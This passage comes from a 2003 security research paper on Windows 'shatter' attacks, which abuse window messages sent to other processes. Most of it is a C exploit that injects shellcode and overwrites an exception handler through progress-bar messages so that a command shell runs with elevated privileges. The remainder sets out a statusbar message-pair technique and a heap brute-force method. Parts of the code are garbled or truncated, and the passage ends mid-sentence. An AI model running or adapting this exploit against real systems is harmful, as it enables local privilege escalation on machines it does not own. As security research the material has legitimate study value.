- or if install with elevated priveledges is turned on. 
You could possibly force it to show a progress bar as system by  
installing an advertised application.  In the worst case also by trying  
to repair a component installed by an admin earlier. 
- simon    
03/10/2003 
Page 8 of 19  
Copyright Security-Assessment.com Ltd 2003 
(Pbrange*) 
Overwrite Example 
Against Progress 
Bars 
/*************************************************************************** 
* Progress Control Shatter exploit 
* 
* Demonstrates the use of Progress Control messages to; 
* - inject shellcode to known location 
* - overwrite 4 bytes of a critical memory address 
* 
* 3 Variables need to be set for proper execution. 
* - tWindow is the title of the programs main window 
* - sehHandler is the critical address to overwrite 
* - shellcodeaddr is the data space to inject the code 
* 
* Local shellcode loads relevant addresses 
* Try it out against any program with a progress bar 
* 
****************************************************************************/ 
#include  
#include  
#include  
// Local Cmd Shellcode. 
BYTE exploit[] = 
"\x90\x68\x74\x76\x73\x6D\x68\x63\x72\x00\x00\x54\xB9\x61\xD9\xE7\x77\xFF\x
D1\x68\x63\x6D\x64\x00\x54\xB9\x44\x80\xC2\x77\xFF\xD1\xCC"; 
char g_classNameBuf[ 256 ]; 
char tWindow[]="Checking Disk C:\\";// The name of the main window 
long sehHandler = 0x7fXXXXXX; // Critical Address To Overwrite 
long shellcodeaddr = 0x7fXXXXXX; // Known Writeable Space Or Global Space 
void doWrite(HWND hWnd, long tByte,long address); 
void IterateWindows(long hWnd); 
int main(int argc, char *argv[]) 
{ 
   long hWnd; 
   HMODULE hMod; 
   DWORD ProcAddr; 
   printf("%% Playing with progress bar messages\n"); 
   printf("%% PI:EMAIL\n\n"); 
   // Find local procedure address 
   hMod = LoadLibrary("kernel32.dll"); 
   ProcAddr = (DWORD)GetProcAddress(hMod, "LoadLibraryA"); 
   if(ProcAddr != 0) 
      // And put it in our shellcode 
      *(long *)&exploit[13] = ProcAddr; 
   hMod = LoadLibrary("msvcrt.dll"); 
   ProcAddr = (DWORD)GetProcAddress(hMod, "system"); 
   if(ProcAddr != 0) 
      // And put it in our shellcode 
      *(long *)&exploit[26] = ProcAddr; 
   printf("+ Finding %s Window...\n",tWindow); 
03/10/2003 
Page 9 of 19  
Copyright Security-Assessment.com Ltd 2003 
   hWnd = (long)FindWindow(NULL,tWindow); 
   if(hWnd == NULL) 
   { 
      printf("+ Couldn't Find %s Window\n",tWindow); 
      return 0; 
   } 
   printf("+ Found Main Window At...0x%xh\n",hWnd); 
   IterateWindows(hWnd); 
   printf("+ Done...\n"); 
   return 0; 
} 
void doWrite(HWND hWnd, long tByte,long address) 
{ 
   SendMessage( hWnd,(UINT) PBM_SETRANGE,0,MAKELPARAM(tByte , 20)); 
   SendMessage( hWnd,(UINT) PBM_GETRANGE,1,address); 
} 
void IterateWindows(long hWnd) 
{ 
   long childhWnd,looper; 
   childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD); 
   while (childhWnd != NULL) 
   { 
      IterateWindows(childhWnd); 
      childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT); 
   } 
   GetClassName( (HWND)hWnd, g_classNameBuf, sizeof(g_classNameBuf) ); 
   if ( strcmp(g_classNameBuf, "msctls_progress32") ==0) 
   { 
  // Inject shellcode to known address 
  printf("+ Sending shellcode to...0x%xh\n",shellcodeaddr); 
  for (looper=0;looper> 8) & 0xff),sehHandler+1); 
  doWrite((HWND)hWnd, ((shellcodeaddr >> 16) & 0xff),sehHandler+2); 
  doWrite((HWND)hWnd, ((shellcodeaddr >> 24) & 0xff),sehHandler+3); 
                // Cause exception 
  printf("+ Forcing Unhandled Exception\n"); 
  SendMessage((HWND) hWnd,(UINT) PBM_GETRANGE,0,1); 
  printf("+ Done...\n"); 
  exit(0); 
} 
} 
03/10/2003 
Page 10 of 19  
Copyright Security-Assessment.com Ltd 2003 
Message Pairing 
As is shown in the examples above, exploitation relies on the use of a pair of 
messages. The first message is used to set the size or other value to the byte 
value we want to write. The second is used to retrieve the value set by the first 
message into a memory address that we want to write to. 
This method of exploitation relies on the availability of both a T-2 and a T-3 type 
message pair. 
For the purpose of this document we will use the following terms to describe how 
message parameters are handled. 
• 
T-1 
The message parameters are handled correctly. An example of this is 
WM_SETTEXT. A pointer is passed to a string value that is adjusted and 
handled safely by the messaging system. The string is copied to memory 
space available to the receiving process and the pointer adjusted 
accordingly. 
• 
T-2 
The message parameters are passed directly. An example of this is 
LVM_SETCOLUMNWIDTH where a long value is passed with the 
message. No pointers are involved. 
• 
T-3 
The message parameters are handled incorrectly. An example of this is 
PBM_GETRANGE. A pointer to a structure is passed to either set or 
receive data. This pointer is used to access the process memory space 
locally, allowing for the setting / retrieving of arbitrary memory spaces. 
Shattering The 
Statusbar Control 
The following sections will concentrate on using multiple messages to achieve the 
same results as shown above. This exploit is carried out against the statusbar 
control using the following messages. 
• 
WM_SETTEXT 
• 
SB_SETTEXT 
• 
SB_GETTEXTLENGTH 
• 
SB_SETPARTS 
• 
SB_GETPARTS 
Its explanation is broken down into two sections.  
• 
The message pair 
• 
The heap brute force 
03/10/2003 
Page 11 of 19  
Copyright Security-Assessment.com Ltd 2003 
The Message Pair 
The statusbar will accept an SB_GETPARTS message that uses a pointer to an 
integer array as a parameter. 
Message 
SB_GETPARTS 
Description 
Retrieves a count of the parts in a status window. The message 
also retrieves the coordinate of the right edge of the specified 
number of parts. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) SB_GETPARTS,      // message ID 
(WPARAM) wParam,      // = (WPARAM) (int) nParts; 
(LPARAM) lParam      // = (LPARAM) (LPINT) 
                                                          aRightCoord; );       
Parameters 
nParts 
Number of parts for which to retrieve coordinates. If 
this parameter is greater than the number of parts in 
the window, the message retrieves coordinates for 
existing parts only. 
aRightCoord 
Pointer to an integer array that has the same number 
of elements as parts specified by nParts. Each 
element in the array receives the client coordinate of 
the right edge of the corresponding part. If an element 
is set to -1, the position of the right edge for that part 
extends to the right edge of the window. To retrieve 
the current number of parts, set this parameter to zero. 
Following the trend described above the lParam parameter is not validated before 
been written to, allowing us to use it to overwrite arbitrary memory addresses.  
This message is a type T-3. 
The pairing message, used to set the parts width is defined as. 
Message 
SB_SETPARTS 
Description 
Sets the number of parts in a status window and the coordinate 
of the right edge of each part. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) SB_SETPARTS,      // message ID     
(WPARAM) wParam,      // = (WPARAM) (int) nParts;    
(LPARAM) lParam     // = (LPARAM) (LPINT) aWidths);   
Parameters 
NParts 
Number of parts to set (cannot be greater than 256). 
aWidths 
Pointer to an integer array. The number of elements is 
specified in nParts. Each element specifies the 
position, in client coordinates, of the right edge of the 
corresponding part. If an element is -1, the right edge 
of the corresponding part extends to the border of the 
window. 
This message accepts a pointer to an integer array to set the width of the number 
of specified parts. This message is also a type T-3. 
03/10/2003 
Page 12 of 19  
Copyright Security-Assessment.com Ltd 2003 
To exploit the SB_GETPARTS/SB_SETPARTS message pair, we must first be 
able to write enough data into a process memory space to create an integer array. 
For our purposes this array only needs to contain one item, for us to set the width 
of the first column so we can then write the right edge value of the first column to 
our arbitrary memory space. 
The Heap Brute 
Force 
Getting arbitrary data into a processes memory space can be done in a number of 
ways that have been covered in previous shatter documents. For this example we 
will use the WM_SETTEXT message. 
Message 
WM_SETTEXT 
Description 
An application sends a WM_SETTEXT message to set the text 
of a window. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) WM_SETTEXT,      // message ID      
wParam = 0;                     // not used; must be zero  
lParam = (LPARAM)(LPCTSTR)lpsz; // address of  
                                                    window-text string 
Parameters 
lpsz 
Value of lParam. Pointer to a null-terminated string that 
is the window text. 
We will use this message to set the vulnerable applications title bar to data of our 
choosing. Eventually we will use this message to send the bytes we want to write, 
byte by byte, as the integer size array needed by the SB_SETPARTS message. 
Before we can use this data with SB_SETPARTS though, we need to know the 
location within the heap that it is stored.  
We can brute force this location through a combination of SB_SETTEXT and 
SB_GETTEXTLENGTH messages. 
Message 
SB_SETTEXT 
Description 
The SB_SETTEXT message sets the text in the specified part 
of a status window. 
Called As 
SendMessage( 
(HWND) hWndControl,        // handle to control 
(UINT) SB_SETTEXT,         // message ID 
(WPARAM) wParam,     // = (WPARAM) (UINT) Ipart 
(LPARAM) lParam            // = (LPARAM) (LPSTR) 
                                                                szText ); 
Parameters 
IPart 
Zero-based index of the part to set. If this parameter is 
set to SB_SIMPLEID, the status window is assumed to 
be a simple window with only one part.  
szText 
Pointer to a null-terminated string that specifies the 
text to set.  
The title bar text is stored as Unicode, so if we send WM_SETTEXT with a large 
string of X’s it will appear in the receiving processes memory as; 
03/10/2003 
Page 13 of 19  
Copyright Security-Assessment.com Ltd 2003 
If we send multiple SB_SETTEXT messages, specifying our ‘heap guess’ location 
as the szText parameter. The text of part one will be set to X when we have 
guessed the correct heap memory address.  
We cannot use the SB_GETTEXT message to check the text of part one, 
because it also is a T-3 message. We can however use SB_GETTEXTLENGTH, 
which is a T-2 message. 
Message 
SB_GETTEXTLENGTH 
Description 
The SB_GETTEXTLENGTH message retrieves the length, in 
characters, of the text from the specified part of a status 
window. 
Called As 
SendMessage( 